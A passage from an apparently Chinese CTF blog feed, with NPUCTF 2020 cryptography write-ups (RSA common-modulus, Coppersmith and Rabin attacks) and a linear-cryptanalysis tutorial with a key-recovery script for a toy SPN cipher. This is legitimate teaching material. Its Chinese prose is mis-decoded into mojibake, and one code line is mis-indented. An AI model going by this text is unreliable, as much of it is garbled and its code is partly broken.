class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>):</span><br><span class="line">    idx = md5_set.index(pt[<span class="number">16</span> * i:<span class="number">16</span> * (i + <span class="number">1</span>)])</span><br><span class="line">    flag += chr(str_set[idx])</span><br><span class="line">flag</span><br></pre></td></tr></table></figure><h4 id="More-1"><a href="#More-1" class="headerlink" title="[More]"></a>[More]</h4><p>è§£<code>old_state[103]</code>é‚£é‡Œé‡‡ç”¨z3è§£æ–¹ç¨‹å¤±è´¥ï¼ˆåŸå› æ˜¯Intç±»å‹ä¸æ”¯æŒä½è¿ç®—ï¼Œä½†BitVec(â€˜s103â€™, 32)åˆæ˜¯åœ¨$GF(2^{32})$ä¸Šçš„å…ƒï¼ŒåŸºç¡€è¿ç®—å®šä¹‰ä¸ä¸€è‡´ï¼Œæ±‚è§£ç»“æœé”™è¯¯ï¼‰</p><p>å› æ­¤é‡‡ç”¨äº†æ‰‹åŠ¨è§£æ–¹ç¨‹çš„åŠæ³•ï¼Œåç»­å¦‚æœçŸ¥é“æœ‰è½®å­å†è¡¥</p><h3 id="å…±æ¨¡æ”»å‡»"><a href="#å…±æ¨¡æ”»å‡»" class="headerlink" title="å…±æ¨¡æ”»å‡»"></a>å…±æ¨¡æ”»å‡»</h3><h4 id="é¢˜ç›®è€ƒç‚¹-2"><a href="#é¢˜ç›®è€ƒç‚¹-2" class="headerlink" title="[é¢˜ç›®è€ƒç‚¹]"></a>[é¢˜ç›®è€ƒç‚¹]</h4><ul><li>å…±æ¨¡æ”»å‡»</li><li>æœ‰é™åŸŸå¼€æ ¹</li><li>CopperSmith</li></ul><h4 id="é¢˜ç›®æ–‡ä»¶-2"><a href="#é¢˜ç›®æ–‡ä»¶-2" class="headerlink" title="[é¢˜ç›®æ–‡ä»¶]"></a>[é¢˜ç›®æ–‡ä»¶]</h4><p><a href="ezrsa_c799462e82d9c969f1d28a373733e6f1.zip.zip">Click Here to Download</a></p><h4 id="é¢˜è§£åˆ†æ-2"><a href="#é¢˜è§£åˆ†æ-2" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>hint.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">m = bytes_to_long(hint)</span><br><span class="line">p = getPrime(<span class="number">256</span>)</span><br><span class="line">c = pow(m, <span class="number">256</span>, p)</span><br><span class="line">print(p)</span><br><span class="line">...</span><br><span class="line"><span class="comment"># cå¯ä»¥é€šè¿‡çœŸÂ·å…±æ¨¡æ±‚å‡ºæ¥</span></span><br></pre></td></tr></table></figure><p>256éç´ æ•°ï¼Œæ‡’å¾—è‡ªå·±å†™æœ‰é™åŸŸå¼€æ ¹é«˜æ•ˆç®—æ³•äº†â€¦sageç›´æ¥æ¥</p><p><img src= "/img/loading.gif" data-src="/2020/04/19/WriteUp-NPUCTF-Crypto/Snipaste_2020-04-21_21-49-44.png" alt></p><p>å†å›åˆ°task.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p, q = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e1, e2 = p, q</span><br><span class="line">c1, c2 = pow(m, e1, n), pow(m, e2, n)</span><br><span class="line"></span><br><span class="line">print(n)</span><br><span class="line">print(c1)</span><br><span class="line">print(c2)</span><br></pre></td></tr></table></figure><p>hintç»™å‡ºmæ¯”ç‰¹é•¿åº¦ä¸Šç•Œï¼Œè”æƒ³åˆ°coppersmithï¼Œå†å¯è¡Œæ€§åˆ†æå¦‚ä¸‹ï¼š</p><p>$c1\equiv m^{p}\equiv m(mod\ p),c2\equiv m^{q}\equiv m(mod\ q)$</p><p>$\therefore n|(c1-m)(c2-m)$</p><p>ä¸Šç•Œåˆ†æ$\frac{1}{2}n^{\frac{1^{2}}{2}}\approx 2^{511}$ï¼Œè€Œä¸Šé¢hintå·²ç»ç»™äº†size(m)&lt;400ï¼Œæ‰€ä»¥å¯è¡Œæ€§åˆ†æé€šè¿‡</p><p><img src= "/img/loading.gif" data-src="/2020/04/19/WriteUp-NPUCTF-Crypto/Snipaste_2020-04-21_21-58-34.png" alt></p><h4 id="exp-2"><a href="#exp-2" class="headerlink" title="[exp]"></a>[exp]</h4><p>æ²¡å®Œæ•´çš„- -æŒ‰ä¸Šé¢çš„æˆªå›¾æ‰‹åŠ¨æµ‹å°±å¥½</p><h4 id="More-2"><a href="#More-2" class="headerlink" title="[More]"></a>[More]</h4><p>coinå¸ˆå‚…è¿˜æ˜¯å¼ºå•Šquq</p><h3 id="EzRSA"><a href="#EzRSA" class="headerlink" title="EzRSA"></a>EzRSA</h3><h4 id="é¢˜ç›®è€ƒç‚¹-3"><a href="#é¢˜ç›®è€ƒç‚¹-3" class="headerlink" title="[é¢˜ç›®è€ƒç‚¹]"></a>[é¢˜ç›®è€ƒç‚¹]</h4><ul><li>å·²çŸ¥(e, n, d)æ¢å¤(p, q)</li><li>Rabinè§£å¯†</li></ul><h4 id="é¢˜ç›®æ–‡ä»¶-3"><a href="#é¢˜ç›®æ–‡ä»¶-3" class="headerlink" title="[é¢˜ç›®æ–‡ä»¶]"></a>[é¢˜ç›®æ–‡ä»¶]</h4><p><a href="difficultrsa.py">Click Here to Download</a></p><h4 id="é¢˜è§£åˆ†æ-3"><a href="#é¢˜è§£åˆ†æ-3" class="headerlink" title="[é¢˜è§£åˆ†æ]"></a>[é¢˜è§£åˆ†æ]</h4><p>é¢˜ç›®ç»™å‡º<code>n</code>ï¼Œ<code>lcm(p-1,q-1)</code>ï¼Œ<code>c</code>ï¼Œ<code>e</code>ï¼Œæµ‹è¯•å‘ç°<code>GCD(e, lcm) == 2</code></p><p>å› æ­¤ä»¤<code>d=inverse(e//2,lcm)</code>ï¼Œåˆ™$m^{2}\equiv c^{d}(mod\ n)$</p><p>ä½†éæœ‰é™åŸŸä¸‹çš„äºŒæ¬¡æ ¹æ±‚è§£éš¾åº¦åœ¨mè¶³å¤Ÿå¤§çš„æ—¶å€™å‡ ä¹ä¸å¯è¡Œï¼Œäºæ˜¯æ€è·¯è½¬å‘åˆ†è§£n</p><p>æ¯”èµ›çš„æ—¶å€™å‘ç°<code>size(lcm) == 2045</code>ï¼Œä¹Ÿå°±æ˜¯è¯´<code>GCD(p-1,q-1)</code>æå°ï¼Œçˆ†ç ´å°ç´ æ•°ç»„åˆå³å¯ï¼Œå‘ç°GCDä¸º8</p><p>æˆåŠŸåˆ†è§£Nï¼Œæ±‚è§£Rabinå³å¯ï¼ˆå½“ç„¶ï¼Œè¿™æ˜¯éé¢„æœŸâ€¦shallowå¸ˆå‚…åæ¥æäº†ä¸€ä¸‹æ‰ååº”è¿‡æ¥ï¼Œè¿™é“é¢˜è€ƒå¯Ÿçš„ç‚¹å®é™…ä¸Šæ˜¯å·²çŸ¥(e, n, d)æ¥åˆ†è§£nï¼‰</p><p>å…³äºå·²çŸ¥(e, n, d)åˆ†è§£Nï¼Œæˆ‘åœ¨ä¹‹å‰çš„åšå®¢ä¹Ÿæåˆ°è¿‡<a href="http://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/#rsa---given-e-d-n" target="_blank" rel="noopener">http://0xdktb.top/2020/02/28/Summary-of-Crypto-in-CTF-RSA/#rsaâ€”-given-e-d-n</a></p><h4 id="exp-3"><a href="#exp-3" class="headerlink" title="[exp]"></a>[exp]</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime, gcd</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">lcm = </span><br><span class="line">e = </span><br><span class="line"><span class="keyword">assert</span>(GCD(lcm, e) == <span class="number">2</span>)</span><br><span class="line">n = </span><br><span class="line">d = inverse(e // <span class="number">2</span>, lcm)</span><br><span class="line">m2 = pow(c, d, n) <span class="comment"># m^2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Factorize</span><span class="params">(n, e, d)</span>:</span></span><br><span class="line">    g = <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        k = e * d - <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> k &amp; <span class="number">1</span>:</span><br><span class="line">            k //= <span class="number">2</span></span><br><span class="line">            p = int(gcd(pow(g, k, n) - <span class="number">1</span>, n)) % n</span><br><span class="line">            <span class="keyword">if</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">        g = int(next_prime(g))</span><br><span class="line">        </span><br><span class="line">(p, q) = Factorize(n, e // <span class="number">2</span>, d)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ä¸‹é¢æ±‚è§£Rabinæ˜¯ç”¨sageæ‰‹åŠ¨æµ‹çš„ï¼Œå¦‚æœæƒ³åˆæˆå®Œæ•´è„šæœ¬çš„è¯è¯·ç”¨æ±‚è§£Rabinçš„è„šæœ¬(å¤šç§å¯èƒ½è¦è¿›è¡Œç­›é€‰)</span></span><br><span class="line">m_p = sympy.nthroot_mod(m2, <span class="number">2</span>, p)</span><br><span class="line">m_q = sympy.nthroot_mod(m2, <span class="number">2</span>, q)</span><br><span class="line">m = crt([m_p, m_q], [p, q])</span><br><span class="line">long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b'NPUCTF&#123;diff1cult_rsa_1s_e@sy&#125;'</span></span><br></pre></td></tr></table></figure><h3 id="EzLCG"><a href="#EzLCG" class="headerlink" title="EzLCG"></a>EzLCG</h3><h4 id="å‡ºé¢˜æ‰‹è®°"><a href="#å‡ºé¢˜æ‰‹è®°" class="headerlink" title="[å‡ºé¢˜æ‰‹è®°]"></a>[å‡ºé¢˜æ‰‹è®°]</h4><p><a href="EzLCG.pdf">Click Here to Download</a></p><h3 id="EzSPN"><a href="#EzSPN" class="headerlink" title="EzSPN"></a>EzSPN</h3><h4 id="å‡ºé¢˜æ‰‹è®°-1"><a href="#å‡ºé¢˜æ‰‹è®°-1" class="headerlink" title="[å‡ºé¢˜æ‰‹è®°]"></a>[å‡ºé¢˜æ‰‹è®°]</h4><p><a href="EzSPN.pdf">Click Here to Download</a></p>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Summary-of-Crypto-in-CTF(Block)</title>
      <link href="/2020/04/11/Summary-of-Crypto-in-CTF-Block/"/>
      <url>/2020/04/11/Summary-of-Crypto-in-CTF-Block/</url>
      
        <content type="html"><![CDATA[<h3 id="Feistel-SPç»“æ„"><a href="#Feistel-SPç»“æ„" class="headerlink" title="Feistel-SPç»“æ„"></a>Feistel-SPç»“æ„</h3><p>ä¸‹å›¾å³ä¸ºFeistel-SPç»“æ„çš„é€šç”¨æ¨¡å‹ï¼Œå…¶ä¸­Få‡½æ•°æ˜¯SPç»“æ„</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-07-09_13-55-29.png" alt></p><p>æ³¨ï¼š$X_{i}^{1}$å’Œ$Y_{i}^{1}$åˆ†åˆ«è¡¨ç¤º<strong>é€šè¿‡$S_{1}$çš„è¾“å…¥å’Œè¾“å‡ºå‘é‡</strong>ï¼Œ$X_{i}^{j},Y_{i}^{j}$ç±»ä¼¼.</p><h3 id="çº¿æ€§åˆ†æ"><a href="#çº¿æ€§åˆ†æ" class="headerlink" title="çº¿æ€§åˆ†æ"></a>çº¿æ€§åˆ†æ</h3><h4 id="Theorem"><a href="#Theorem" class="headerlink" title="Theorem"></a>Theorem</h4><p>åŸºæœ¬æ–¹æ³•å³ä¸ºå¯»æ‰¾ä¸€ä¸ªç»™å®šå¯†ç ç³»ç»Ÿä¸‹ï¼Œå…·æœ‰å¦‚ä¸‹å½¢å¼çš„æœ‰æ•ˆçº¿æ€§è¡¨è¾¾å¼</p><script type="math/tex; mode=display">P[i_{1},...,i_{a}]\oplus C[j_{1},...,j_{b}]=K[k_{1},...,k_{c}]</script><p>($i_{1},â€¦,i_{a};j_{1},â€¦,j_{b};k_{1},â€¦,k_{c}$å‡ä¸ºå›ºå®šæ¯”ç‰¹ä½)</p><p>è®¾$X_{1},X_{2},â€¦,X_{k}$ä¸º$\{0,1\}$ä¸Šçš„ç‹¬ç«‹éšæœºå˜é‡ï¼Œ$Pr(X_{i}=0)=p_{i},Pr(X_{i}=1)=1-p_{i}$ï¼Œåˆ™ç”¨åˆ†å¸ƒåå·®æ¥è¡¨ç¤ºå…¶æ¦‚ç‡åˆ†å¸ƒï¼Œå®šä¹‰å¦‚ä¸‹</p><script type="math/tex; mode=display">\epsilon_{i}=p_{i}-\frac{1}{2}</script><p>[å †ç§¯å¼•ç†] - $Pr(X_{1}\oplus â€¦\oplus X_{n}=0)=\frac{1}{2}+2^{n-1}\prod_{i=1}^{n}\epsilon_{i}$ï¼Œæˆ–è¡¨ç¤ºä¸º$\epsilon_{1,2,â€¦,n}=2^{n-1}\prod_{i=1}^{n}\epsilon_{i}$.</p><p>åˆ©ç”¨å †ç§¯å¼•ç†ï¼Œæˆ‘ä»¬å³å¯ä»¥å¯¹æ¯è½®å˜æ¢ä¸­åå·®æœ€å¤§çš„çº¿æ€§é€¼è¿‘å¼è¿›è¡Œç»„åˆï¼Œç»„åˆåçš„çº¿æ€§é€¼è¿‘å¼ä¹Ÿå°†æ‹¥æœ‰æœ€ä½³çš„åå·®ï¼Œå³ä¸ºè¦æ‰¾çš„æœ€ä½³çº¿æ€§é€¼è¿‘å¼</p><p>[SPN]</p><p>ä¸‹ä¸ºå•è½®SPNçš„ç¤ºæ„å›¾</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/Snipaste_2020-04-11_23-20-06.png" alt></p><p>å¯è§éçº¿æ€§ç»“æ„åªæœ‰Sç›’ï¼Œå› æ­¤åªå¯¹å…¶ä½œåå·®ä¼°è®¡ï¼Œå…·ä½“æ–¹æ³•å¦‚ä¸‹ï¼ˆå‡è®¾Sç›’ä¸º16*16ï¼‰ï¼š</p><p>å°†è¾“å…¥çš„çº¿æ€§è¿‘ä¼¼è¡¨ç¤ºä¸º$a_{1}\cdot X_{1}\oplus a_{2}\cdot X_{2}\oplus â€¦\oplus a_{8}\cdot X_{8}(a_{i}\in \{0,1\})$ï¼Œå¯¹åº”çš„ï¼Œæˆ‘ä»¬ä¹Ÿå°†è¾“å‡ºçº¿æ€§è¿‘ä¼¼è¡¨ç¤ºä¸º$b_{1}\cdot Y_{1}\oplus b_{2}\cdot Y_{2}\oplus â€¦\oplus b_{8}\cdot Y_{8}(b_{i}\in \{0,1\})$ï¼Œç©·ä¸¾æ‰€æœ‰ç»„åˆ$(a,b)$å¯¹åº”çš„ä½¿å¾—çº¿æ€§è¿‘ä¼¼è¾“å…¥$\oplus$çº¿æ€§è¿‘ä¼¼è¾“å‡º=0çš„åå·® (256*256)</p><p>åå·®è®¡ç®—å…¬å¼$\epsilon(a,b)=(N_{L}(a,b)-128)/256$ï¼ˆ$N_{L}(a,b)$ä¸ºå›ºå®š(a,b)ä¸‹ï¼Œæ»¡è¶³ä¸Šè¿°æ¡ä»¶çš„(X,Y)çš„ä¸ªæ•°ï¼‰</p><p>æˆ‘ä»¬çš„ç›®çš„å°±æ˜¯è¦æ‰¾åˆ°$|\epsilon(a,b)|_{max}$å¯¹åº”çš„çº¿æ€§è¡¨è¾¾å¼ï¼Œå°†å…¶ä½œä¸ºè¯¥å•ä¸ªSç›’ä¸‹çš„æœ€ä½³çº¿æ€§ä¼°è®¡</p><p>ä»¥ä¸‹é¢çš„SPNç½‘ç»œè¿›è¡Œè®¨è®ºåˆ†æï¼š</p><p><img src= "/img/loading.gif" data-src="/2020/04/11/Summary-of-Crypto-in-CTF-Block/QQå›¾ç‰‡20200412233456.jpg" alt></p><p>ä¸­é—´çš„Pç›’å¦‚ä¸‹ï¼š</p><script type="math/tex; mode=display">\left[\begin{matrix}1 & 9 & 17 & 25 & 33 & 41 & 49 & 57\\2 & 10 & 18 & 26 & 34 & 42 & 50 & 58\\... & ... & ... & ... & ... & ... & ... & ...\\8 & 16 & 24 & 32 & 40 & 48 & 56 & 64\end{matrix}\right]</script><p>ä¸ºæ–¹ä¾¿åˆ†æï¼Œæˆ‘ä»¬å‡è®¾$S_{11}=S_{12}=â€¦=S_{18}$ï¼Œåœ¨æ‰¾åˆé€‚çš„çº¿æ€§é€¼è¿‘å‰ï¼Œæˆ‘ä»¬è¦çŸ¥é“ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p><ul><li>æ¯ä¸ªçº¿æ€§é€¼è¿‘å¯¹åº”çš„å¯†é’¥å­é›†çŒœæµ‹ç©ºé—´ä¸èƒ½è¿‡å¤§ï¼ˆè¿™é‡Œæˆ‘ä»¬ä½¿å¾—æ¯ä¸ªçº¿æ€§é€¼è¿‘è¡¨è¾¾å¼é‡Œçš„$C_{i}$æ»¡è¶³$8j&lt; i\leq 8(j+1)$ï¼Œjåœ¨æ¯æ¬¡çŒœæµ‹ä¸‹å„è‡ªå›ºå®šï¼‰</li><li>æ¶‰åŠçº¿æ€§ä¼°è®¡çš„Sç›’ä¸èƒ½è¿‡å¤šï¼ˆå †ç§¯å¼•ç†$\epsilon_{1,2,â€¦,n}=2^{n-1}\prod_{i=1}^{n}\epsilon_{i}$å¯çŸ¥ï¼Œæ€»åç§»é‡çš„ç»å¯¹å€¼ä¼šéšç€nçš„å¢å¤§è€Œå‡å°ï¼Œæ€»åç§»é‡è¿‡å°ä¼šä½¿å¾—åœ¨çŒœæµ‹å¯†é’¥æ—¶çš„æˆåŠŸç‡æä½ï¼‰</li></ul><p>å› æ­¤æˆ‘ä»¬é€‰æ‹©åˆ†åˆ«å¯¹åº”$S_{11}$å…«ä¸ªè¾“å‡ºçš„å…«ä¸ª$S_{11}$çš„æœ€å¤§åå·®çº¿æ€§ä¼°è®¡ï¼Œæ¥è¿›è¡Œå…«ä¸ªç¬¬äºŒè½®å­å¯†é’¥çš„çŒœæµ‹ï¼ˆåŸºäºä¸æ­£ç¡®çš„éšæœºå¯†é’¥ä¼šä½¿å¾—æµ‹è¯•çš„æ˜å¯†æ–‡å¯¹ä¸­ï¼Œæ»¡è¶³çº¿æ€§è¡¨è¾¾å¼çš„æ¦‚ç‡è¶‹äº$\frac{1}{2}$ï¼Œå³åå·®å‡å°ï¼‰ï¼Œæ€»çš„çŒœæµ‹ç©ºé—´ä¸º256*8</p><p>ä»¥$K_{2,1},K_{2,2},â€¦,K_{2,8}$ä¸ºä¾‹ï¼Œå–$u_{1}$ä¸º$S_{21}^{-1}(C_{1}\oplus K_{2,1}||C_{2}\oplus K_{2,2}||â€¦||C_{8}\oplus K_{2,8})$çš„æœ€é«˜ä½æ¯”ç‰¹</p><p>ä»ä¸Šè¿°Sç›’çš„åˆ†æå¾—å‡º$S_{11}$å›ºå®š$b=10000000$æ—¶ï¼Œæœ€å¤§åå·®çº¿æ€§ä¼°è®¡å¯¹åº”çš„$a(a_{1}a_{2}a_{3}a_{4}a_{5}a_{6}a_{7}a_{8})$ï¼Œå› ä¸º$K_{1,i}s$å¼‚æˆ–ä¸ºå®šå€¼(0/1)ï¼Œæ•…ä¸äºˆåŠ å…¥çº¿æ€§è¡¨è¾¾å¼ï¼Œ$u_{2}$å–ä¸º$P_{a_{i}}s$çš„å¼‚æˆ–$(a_{i}å‡ç­‰äº1)$</p><p>å¯†é’¥ç©ºé—´ä¸º256ï¼Œä¸”æ¯æ¬¡å–ç›¸åŒ10000ç»„æ•°æ®è¿›è¡Œçº¿æ€§åˆ†æï¼Œåˆ™å‡è®¾ä½¿å¾—$u_{1}\oplus u_{2}=0$æˆç«‹çš„ç»„æ•°ä¸ºNï¼Œ$bias=|\frac{N-5000}{10000}|$ï¼Œå¾ˆå¤§æ¦‚ç‡ä¸‹ï¼Œ$bias_{max}$å¯¹åº”çš„å³ä¸ºæ­£ç¡®å¯†é’¥</p><p>ç¬¬äºŒè½®å­å¯†é’¥å®Œå…¨æ¢å¤åï¼Œä»»å–ä¸€ç»„æ˜å¯†æ–‡å¯¹å³å¯è½»æ˜“æ¢å¤ç¬¬ä¸€è½®å­å¯†é’¥ï¼Œçº¿æ€§åˆ†æç»“æŸ</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><p>ä»¥NPUCTF2020å‡ºçš„EzSPNä¸ºä¾‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, sys</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> hexlify, unhexlify</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SZ = <span class="number">8</span></span><br><span class="line">offset = [[<span class="number">0</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)] <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>)]  <span class="comment">#Sboxçº¿æ€§ä¼°è®¡offset</span></span><br><span class="line">linearInput = []</span><br><span class="line">sbox, sboxi, plain, cipher = [], [], [], []</span><br><span class="line">enc_flag = <span class="literal">None</span></span><br><span class="line">coef = [<span class="number">15</span>, <span class="number">11</span>, <span class="number">155</span>, <span class="number">119</span>, <span class="number">11</span>, <span class="number">99</span>, <span class="number">83</span>, <span class="number">249</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getData</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> enc_flag, sbox, sboxi</span><br><span class="line">    io = remote(ip, port)</span><br><span class="line">    sbox_str = io.recvline()</span><br><span class="line">    sbox = eval(sbox_str)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">    sboxi.append(sbox.index(i))</span><br><span class="line">    enc_flag = io.recvline().strip().decode(<span class="string">"utf8"</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">        print(<span class="string">"[+] Getting data...(&#123;&#125;/10000)"</span>.format(i))</span><br><span class="line">        pt = hexlify(os.urandom(<span class="number">8</span>)).decode(<span class="string">"utf8"</span>)</span><br><span class="line">        plain.append(pt)</span><br><span class="line">        io.sendline(pt)</span><br><span class="line">        ct = io.recvline().strip().decode(<span class="string">"utf8"</span>)</span><br><span class="line">        cipher.append(ct)</span><br><span class="line">    io.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">doxor</span><span class="params">(l1, l2)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> [x[<span class="number">0</span>] ^ x[<span class="number">1</span>] <span class="keyword">for</span> x <span class="keyword">in</span> zip(l1, l2)]</span><br><span class="line"></span><br><span class="line"><span class="comment"># çº¿æ€§å±‚</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span><span class="params">(blk)</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">0</span>, SZ, <span class="number">8</span>):</span><br><span class="line">        cur = blk[k:k+<span class="number">8</span>]</span><br><span class="line">        cur = [(cur[i] * coef[i]) % <span class="number">256</span> <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>)]</span><br><span class="line">        bits = [bin(x)[<span class="number">2</span>:].rjust(<span class="number">8</span>, <span class="string">'0'</span>) <span class="keyword">for</span> x <span class="keyword">in</span> cur]</span><br><span class="line">        bits = bits[<span class="number">-1</span>:] + bits[:<span class="number">-1</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">            res.append(int(<span class="string">''</span>.join([x[i] <span class="keyword">for</span> x <span class="keyword">in</span> bits]), <span class="number">2</span>))</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bitxor</span><span class="params">(n, mask)</span>:</span></span><br><span class="line">    bitlist = [int(x) <span class="keyword">for</span> x <span class="keyword">in</span> bin(n &amp; mask)[<span class="number">2</span>:]]</span><br><span class="line">    <span class="keyword">return</span> bitlist.count(<span class="number">1</span>) % <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Sboxçº¿æ€§ä¼°è®¡</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linearSbox</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> linearInput</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        si = sbox[i]</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">            <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">                a = bitxor(i, j) <span class="comment"># çº¿æ€§ä¼°è®¡è¾“å…¥</span></span><br><span class="line">                b = bitxor(si, k) <span class="comment"># çº¿æ€§ä¼°è®¡è¾“å‡º </span></span><br><span class="line">                <span class="keyword">if</span> a == b:</span><br><span class="line">                    offset[j][k] += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">256</span>):</span><br><span class="line">        offset[i] = [abs(x - <span class="number">128</span>) / <span class="number">256</span> <span class="keyword">for</span> x <span 